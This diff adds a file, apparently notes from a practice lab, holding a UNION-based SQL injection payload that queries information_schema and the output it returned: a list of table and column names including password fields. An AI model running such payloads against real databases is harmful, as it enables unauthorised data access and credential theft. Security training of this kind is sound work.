@@ -1,0 +1,78 @@
+1 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns
+
+
+
+
+First name: db_default
+Surname : id
+
+First name: db_default
+Surname : username
+
+First name: db_default
+Surname : password
+
+
+
+First name: users
+Surname : user_id
+
+First name: users
+Surname : first_name
+
+First name: users
+Surname : last_name
+
+First name: users
+Surname : town
+
+First name: users
+Surname : country
+
+First name: users
+Surname : planet
+
+First name: users
+Surname : Commentaire
+
+First name: users
+Surname : countersign
+
+
+
+First name: guestbook
+Surname : id_comment
+
+First name: guestbook
+Surname : comment
+
+First name: guestbook
+Surname : name
+
+
+
+First name: list_images
+Surname : id
+
+First name: list_images
+Surname : url
+
+First name: list_images
+Surname : title
+
+First name: list_images
+Surname : comment
+
+
+
+First name: vote_dbs
+Surname : id_vote
+
+First name: vote_dbs
+Surname : vote
+
+First name: vote_dbs
+Surname : nb_vote
+
+First name: vote_dbs
+Surname : subject
